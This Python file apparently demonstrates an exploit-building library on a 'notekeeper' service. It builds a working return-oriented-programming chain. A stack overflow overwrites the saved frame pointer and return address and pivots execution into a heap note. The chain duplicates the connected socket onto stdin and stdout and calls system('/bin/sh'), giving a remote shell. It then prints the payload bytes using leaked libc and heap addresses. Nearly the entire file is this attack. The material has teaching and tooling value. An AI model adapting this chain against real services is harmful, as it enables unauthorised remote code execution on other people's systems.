#!/usr/bin/env python3
# Copyright (c) 2026 Zetier
# SPDX-License-Identifier: Apache-2.0
# mypy: disable-error-code="valid-type"
# notekeeper-pwn, the escalation: the same bytes a THIRD time (run check.py and
# see), but here the chain is CHECKED. after.py declared the frames as Views and
# linked them by hand -- correct, but on the honor system. Here the ropper
# catalog is Gadget declarations (gadgets.py); the chain lays the frames, links
# every pivot, and wires every gadget address itself -- and the fold proves what
# after.py hopes: every dup2/system argument fed by a named pop slot, nothing
# riding a register across a call that clobbers it, and rsp landing
# 16-byte-aligned-minus-8 at every libc call (the movaps rule -- CHK-207 refuses
# the classic crash at build time; refusal.py trips it).
from gadgets import Dup2Call
from gadgets import LeaveRet
from gadgets import PopRdi
from gadgets import PopRsiR15
from gadgets import RetAlign
from gadgets import SystemCall

import cento
from cento.abi.x86_64 import X86_64

FD = 4  # our socket: 3 is notes.db, 4 accept()'d us (strace'd)
NOTE_SZ = 0x100  # add-note reads exactly this many bytes
OFFSET = 0x40  # dst[64]: the rename handler's 0x50-byte read overflows by rbp + rip only


class BinShString(cento.View):
    s: cento.Bytes(8) = b"/bin/sh\x00"


class Smash(cento.View):  # the 16 bytes past dst[64]: saved rbp, saved rip
    rbp: cento.u64  # the pivot target: the chain's entry frame (leave #1 loads it)
    rip: cento.u64 = LeaveRet.entry  # leave #2: rsp <- rbp -- the slab is the stack now


layout = cento.Layout(endian="little")
layout.expect_sym("libc_base", align=0x1000)  # page-aligned, or you read it wrong
layout.expect_sym("slab_base", align=0x10)  # malloc's 16-alignment is also what CHK-207 judges rsp against

# The note body: one chain. Frames place at the cursor, pivots re-aim it, and the
# machinery writes every next_rbp link and gadget address -- no offset is ever typed.
slab = layout.region("slab", max_size=NOTE_SZ)
run = slab.chain("frames", at=0x10, abi=X86_64, arm=False)  # hop frames start past the entry frame (two qwords at slab+0); the trigger is the stack smash
entry = run.enter(LeaveRet)  # the hijack lands here: saved rip = leave;ret, saved rbp = this frame


def dup2(newfd: int) -> None:
    """One dup2(FD, newfd) frame: two pops feed the call, then a pivot hops on."""
    run.hop(PopRdi, f"oldfd{newfd}")
    pops = run.hop(PopRsiR15, f"newfd{newfd}")
    pops.frame.r15 = 0
    call = run.hop(Dup2Call, f"dup2_{newfd}", carry=cento.Carry.Clobbered)  # a call: volatiles die (the ABI spares rbp)
    call.rdi = FD  # seats land in the pop slots that feed the call
    call.rsi = newfd
    run.hop(LeaveRet, f"pivot{newfd}")  # the machinery links the previous frame's rbp here


dup2(0)  # the socket becomes stdin
dup2(1)  # and stdout
run.hop(PopRdi, "cmd")
run.hop(RetAlign, "align")  # movaps: drop this and CHK-207 names the crash (refusal.py does)
shell = run.finish(SystemCall)
shell.rdi = slab.alloc(BinShString, "sh")  # place the string, point the seat at it

# The smash: region fill is the pad; the two owned qwords are one View.
stack = layout.region("stack", max_size=OFFSET + len(Smash), fill="A")
smash = stack.at(OFFSET, Smash, name="smash")
smash.rbp = entry.frame  # cross-region: a stack cell holding a heap address

if __name__ == "__main__":
    run.seal()  # the fold: every need fed, every alignment right -- or the CHK-2xx that says why
    layout.bind("libc_base", 0x00007F1FBABC0000, source="puts(got.puts) leak")
    layout.bind("slab_base", 0x0000556E2F4C12A0, source="note[2] stale-ptr print")
    print(f"enhanced slab: {layout.image('slab').hex()}")
    print(f"enhanced stack: {layout.image('stack').hex()}")
